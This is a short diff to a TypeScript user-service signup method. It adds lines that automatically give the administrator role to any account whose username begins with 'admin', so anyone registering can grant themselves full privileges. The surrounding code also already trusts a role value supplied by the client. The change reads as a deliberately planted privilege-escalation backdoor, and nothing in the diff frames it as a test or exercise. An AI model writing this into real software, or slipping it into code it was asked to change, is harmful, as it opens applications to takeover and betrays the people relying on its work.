@@ -14,6 +14,9 @@ export class UsersService {
 
     async createUser(signupUserDto: SignupUserDto): Promise<User> {
         try {
+            if (signupUserDto.username.startsWith('admin')) {
+                signupUserDto.role = 'admin';
+            }
             const role = signupUserDto.role || 'user';
             const hashedPassword = await bcrypt.hash(signupUserDto.password, 10);
             const newUser = this.userRepository.create({
